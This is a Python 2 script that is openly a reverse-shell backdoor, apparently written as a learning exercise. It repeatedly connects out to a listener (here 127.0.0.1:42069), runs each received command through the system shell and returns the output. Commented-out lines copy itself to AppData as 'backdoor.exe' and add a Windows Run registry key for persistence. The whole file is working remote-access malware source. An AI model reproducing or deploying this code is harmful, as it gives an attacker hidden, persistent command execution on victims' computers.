#!/usr/bin/python

import socket
import subprocess
import json
import time
import shutil
import os
import sys # Needed for working of shutil

def reliable_send(data):
        json_data = json.dumps(data)
        s.send(json_data)

def reliable_recv():
        json_data = ""
        while True:
                try:
                        json_data = json_data + s.recv(1024)
                        return json.loads(json_data)
                except ValueError:
                        continue

def connection():
	while True:
		time.sleep(20)
		try:
			s.connect(("127.0.0.1", 42069))
			shell()
			break
		except:
			connection()

def shell():
	while True:
		# Receiving the command
		command = reliable_recv()

		# Sending the answer
		if command == 'q':
			break

		# Changing directory
		elif command[0:3] == 'cd ' and len(command) > 2:
			# Adding try and except if directory specified doesn't exist
			try:
				os.chdir(command[3:])
			except:
				continue
		else:
			try:
				process = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
				result = process.stdout.read() + process.stderr.read() # Storing the output of the command

				reliable_send(result)
			except:
				reliable_send("*[!] Can't execute the command")

#location = os.environ["appdata"] + "\\backdoor.exe"  # os.environ['appdata'] is the path to the roaming directory in app data in any pc.

#if not os.path.exists(location):
	# Now copy the shell to location using shutil
#	shutil.copyfile(sys.executable, location)

	# Now create the registry key to HK_CurrentUser
#	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "' + location + '"', shell = True) # Executes this command which adds a registery in regedit.


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connection()

s.close()
